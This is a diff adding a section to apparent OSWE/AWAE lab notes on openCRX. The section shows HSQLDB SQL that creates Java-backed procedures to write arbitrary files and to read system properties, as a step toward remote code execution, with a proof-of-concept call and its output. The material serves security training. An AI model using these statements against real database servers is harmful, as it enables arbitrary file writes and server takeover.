@@ -302,3 +302,29 @@ After a few moments, a new GUI window should open.
 **Exploitation Script:** https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openCRX/xxe_lfd.py
 ## Remote Code Execution
 ### Writing to the file system
+```sql
+CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024)) 
+  LANGUAGE JAVA 
+  DETERMINISTIC NO SQL
+  EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
+```
+First, we will do a simple proof of concept to verify it works. We can encode `"It worked!"` as ASCII hex for our payload. We will not specify a file path as part of the `paramString` value.
+```sql
+call writeBytesToFilename('test.txt', cast ('497420776f726b656421' AS VARBINARY(1024)))
+```
+If everything works, we'll find a new file named `test.txt` in the database's working directory. We can call our `systemprop` function again to receive the working directory.
+
+Check system properties1 by calling the Java `System.getProperty()` method.
+```sql
+ CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR 
+  LANGUAGE JAVA 
+  DETERMINISTIC NO SQL
+  EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
+```
+```sql
+VALUES(systemprop('user.dir'))
+```
+Output:
+```
+/home/student/ctx/data/hsqldb
+```
